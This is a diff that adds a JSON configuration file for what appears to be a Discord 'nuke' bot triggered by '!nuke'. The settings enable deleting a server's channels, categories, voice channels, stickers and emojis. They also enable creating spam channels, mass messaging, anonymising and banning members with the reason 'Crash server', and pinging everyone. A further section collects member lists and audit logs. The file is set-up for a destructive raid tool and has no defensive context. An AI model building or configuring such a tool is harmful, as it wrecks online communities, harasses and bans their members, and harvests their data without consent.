@@ -1,0 +1,36 @@
+{
+    "commands": {
+        "command_for_kill": false,
+        "command_prefix": "!",
+        "command": "nuke"
+    },
+    "nasties": {
+        "nasties_status": true,
+        "del_chats": true,
+        "del_categories": true,
+        "del_voices": true,
+        "del_stickers":true,
+        "del_emojis":true,
+        "create_nasty_chats": true,
+        "random_name_of_nasty_chats": true,
+        "names_of_nasty_chats": [],
+        "spam": true,
+        "messages_for_spam": [
+        ],
+        "create_nasty_voices": true,
+        "random_name_of_nasty_voices": true,
+        "names_of_nasty_voices": [],
+        "anonymisation_member": true,
+        "anonymisation_nick": "",
+        "ban_members": true,
+        "ban_reason": "Crash server",
+        "link_everyone": true
+    },
+    "info": {
+        "info_status": true,
+        "user_collector": true,
+        "audit_log_collector": true,
+        "audit_log_limit":100,
+        "last_screen": true
+    }
+}
